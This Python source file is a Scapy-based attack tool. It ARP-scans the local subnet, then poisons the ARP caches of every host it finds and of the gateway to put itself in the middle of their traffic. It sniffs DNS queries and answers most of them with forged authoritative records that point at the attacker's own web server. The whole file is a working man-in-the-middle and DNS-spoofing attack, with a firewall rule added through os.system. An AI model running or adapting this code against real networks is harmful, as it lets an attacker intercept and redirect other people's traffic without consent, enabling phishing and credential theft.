from scapy.all import *
from scapy.layers.dns import DNSQR, DNSRR, DNS
from scapy.layers.inet import IP, ICMP, UDP
from scapy.layers.l2 import ARP, getmacbyip, Ether
from scapy.layers.inet6 import IPv6
import time
import netifaces
import threading
import socket

# op=2 means the flag 2 of arp that repleis to arp brodcast requests
class ARPPoison():
    def __init__(self):
        self.gateway = None
        self.gateway_mac = None
        self.My_Mac = get_if_hwaddr(conf.iface)
        self.targets = None
        self.subnet_mask = 0
        self.lock = threading.Lock()
        self.threads = []
        self.spoofing_active = False
        self.stop_event = threading.Event()
        self.user_input_thread = None
        self.sniff_thread = None
        self.target_sockets = {}
        self.web_port = 8080
        self.my_ip = self.get_my_ip()
        self.Ip_web_server = self.my_ip
        self.excluded_websites = [
            "msftconnecttest.com.",
            "in-addr.arpa.",
            "wpad.local."
        ]
        # Modified exclusion names to be more specific
        self.excluded_names = ["msftconnecttest", "wpad"]
        # Initialize DNS cache
        self.dns_cache = {}
        self.dns_cache_timeout = 300
        # MAC address cache
        self.mac_cache = {}


    def get_mac(self, ip):
        """Get MAC address for an IP, with caching"""
        if ip in self.mac_cache:
            return self.mac_cache[ip]

        try:
            mac = getmacbyip(ip)
            if mac:
                self.mac_cache[ip] = mac
                return mac
        except:
            pass
        return None

    def get_my_ip(self):
        try:
            # Connect to a remote server to determine the IP address in use
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                # Use a public DNS server (e.g., Google DNS at 8.8.8.8)
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            return ip_address
        except Exception as e:
            return "127.0.0.1"

    def gateway_info(self):
        gateways = netifaces.gateways()
        default_gateway = gateways.get(netifaces.AF_INET, [])

        if default_gateway:
            gateway_info = default_gateway[0]
            gateway_ip = gateway_info[0]
            interface_addresses = netifaces.interfaces()

            for interface in interface_addresses:
                interface_info = netifaces.ifaddresses(interface).get(netifaces.AF_INET, [])
                if interface_info:
                    subnet_mask = interface_info[0]['netmask']
                    break
            else:
                subnet_mask = None
        else:
            gateway_ip = None
            subnet_mask = None
        print(gateway_ip, subnet_mask)
        self.subnet_mask = subnet_mask
        self.gateway =  gateway_ip

    def discover_net(self):
        hosts = []
        try:
            # Convert subnet mask to CIDR notation
            subnet_prefix = sum(bin(int(bit)).count('1') for bit in self.subnet_mask.split('.'))
            ip_range = f"{self.gateway}/{subnet_prefix}"
            print(f"Scanning IP range: {ip_range}")
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
            result = srp(arp_request, timeout=10, inter=0)[0]
            for sent, received in result:
                if self.stop_event.is_set():
                    break
                ip = received.psrc
                mac = received.hwsrc
                if mac:
                    if ip == self.gateway:
                        self.gateway_mac = mac
                    else:
                        hosts.append([ip, mac])
                print(f"IP: {ip} - MAC: {mac}")
        except ValueError as e:
            print(f"Error: {e}")
        #targets = {ip: mac for ip, mac in hosts}
        print(hosts)
        self.targets = hosts

    def block_ipv6_dns(self):
        """Block IPv6 DNS queries to force IPv4"""
        ip6tables_cmd = "netsh advfirewall firewall add rule name=\"Block DNS over UDP\" dir=out action=block protocol=UDP localport=53"
        os.system(ip6tables_cmd)

    def spoof(self, target_ip, target_mac, spoof_ip):
        """Modified spoof function with proper MAC addresses"""
        gateway_mac = self.get_mac(spoof_ip)
        if gateway_mac:
            packet = (
                Ether(dst=target_mac, src=self.My_Mac) /
                ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoof_ip,
                    hwsrc=self.My_Mac
                )
            )
            sendp(packet, verbose=False)


    def restore(self, destination_ip, destination_mac, source_ip, source_mac):
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False)

    def clear_expired_cache(self):
        """Clear expired DNS cache entries"""
        current_time = time.time()
        expired_entries = [k for k, v in self.dns_cache.items()
                           if current_time - v['timestamp'] > self.dns_cache_timeout]
        for entry in expired_entries:
            del self.dns_cache[entry]

    def dns_filter(self, packet):
        if not (DNS in packet and packet[DNS].opcode == 0 and UDP in packet and packet[UDP].dport == 53):
            return False

        name = packet[DNSQR].qname.decode()

        # Clear expired cache entries
        self.clear_expired_cache()

        # Check if query is in cache and not expired
        if name in self.dns_cache:
            cache_entry = self.dns_cache[name]
            if time.time() - cache_entry['timestamp'] < self.dns_cache_timeout:
                return True

        if name in self.excluded_websites:
            return False

        if any(excluded_name in name for excluded_name in self.excluded_names):
            return False

        # Add to cache
        self.dns_cache[name] = {
            'timestamp': time.time(),
            'resolved_ip': self.Ip_web_server
        }
        return True

    def change_packets(self, packet):
        """Enhanced packet modification with better error handling and response creation"""
        try:
            if not self.dns_filter(packet):
                return packet

            qname = packet[DNSQR].qname

            # Create DNS response with multiple answer types
            dns_response = (
                    IP(dst=packet[IP].src, src=packet[IP].dst) /
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1,  # This is a response
                        aa=1,  # Authoritative Answer
                        rd=1,  # Recursion Desired
                        ra=1,  # Recursion Available
                        qd=packet[DNS].qd,  # Original question
                        an=DNSRR(
                            rrname=qname,
                            type='A',
                            ttl=1,  # Short TTL to allow quick updates
                            rdata=self.Ip_web_server
                        ) /
                           DNSRR(  # Add a second record for www subdomain
                               rrname=qname,
                               type='A',
                               ttl=1,
                               rdata=self.Ip_web_server
                           )
                    )
            )

            # Add proper Ethernet frame
            dst_mac = self.get_mac(packet[IP].src)
            if dst_mac:
                response = Ether(src=self.My_Mac, dst=dst_mac) / dns_response
                sendp(response, verbose=False)
                print(f"Sent DNS response for {qname.decode()} → {self.Ip_web_server}")

            # Drop the original packet
            return None

        except Exception as e:
            print(f"Error modifying packet: {e}")
            return packet

    def sniff_packets(self):
        """Modified sniffing function with error handling"""
        while self.spoofing_active:
            try:
                sniff(count=1,
                      lfilter=lambda pkt: self.filter_check(pkt),
                      prn=lambda pkt: self.change_packets(pkt),
                      store=0)
            except Exception as e:
                print(f"Sniffing error: {e}")
                time.sleep(0.1)

    def filter_check(self, packet):
        """Enhanced packet filter with IPv6 support"""
        try:
            # Check for DNS queries (both IPv4 and IPv6)
            if (IP in packet and UDP in packet and packet[UDP].dport == 53) or \
                    (IPv6 in packet and UDP in packet and packet[UDP].dport == 53):
                return True

            # Check for target traffic
            if IP in packet and Ether in packet:
                source_ip = packet[IP].src
                dest_ip = packet[IP].dst
                target_ips = [target[0] for target in self.targets]
                return source_ip in target_ips or dest_ip in target_ips

            return False

        except Exception as e:
            print(f"Error in filter check: {e}")
            return False

    def drop(self,packet):
        """Drops the given packet."""
        if isinstance(packet, Packet):
            del packet.payload

    def get_target_socket(self, target_ip):
        with self.lock:
            if target_ip not in self.target_sockets:
                self.target_sockets[target_ip] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            return self.target_sockets[target_ip]

    def start(self):
        self.gateway_info()
        self.discover_net()

        try:
            for target in self.targets:
                thread = threading.Thread(target=self.poison_target, args=(target,))
                self.threads.append(thread)
                thread.start()
            self.sniff_thread = threading.Thread(target=self.sniff_packets, args=())
            self.sniff_thread.start()

            self.user_input_thread = threading.Thread(target=self.get_user_input, args=())
            self.user_input_thread.start()

        except KeyboardInterrupt:
            self.stop_poisoning()

    def poison_target(self, target):
        try:
            self.spoofing_active = True
            while self.spoofing_active:
                self.spoof(target[0], target[1], self.gateway)
                self.spoof(self.gateway, self.gateway_mac, target[0])
                time.sleep(0.3)
        finally:
            pass
    def get_user_input(self):
        while self.spoofing_active:
            user_input = input("Enter 'stop' to stop ARP spoofing, or any other key to continue: ").lower()
            if user_input == 'stop':
                self.stop_poisoning()
                print("ARP spoofing stopped.")
                break

    def restore_network(self):
        if self.targets:
            for target in self.targets:
                self.restore(target[0], target[1], self.gateway, self.gateway_mac)
                self.restore(self.gateway, self.gateway_mac, target[0], target[1])
        else:
            print("there arent any targets")


    def stop_poisoning(self):
        self.stop_event.set()  # Set the stop_event before joining threads
        self.spoofing_active = False
        for thread in self.threads:
            thread.join()
        self.restore_network()
        self.user_input_thread.join()



if __name__ == '__main__':
    a = ARPPoison()

    a.start()
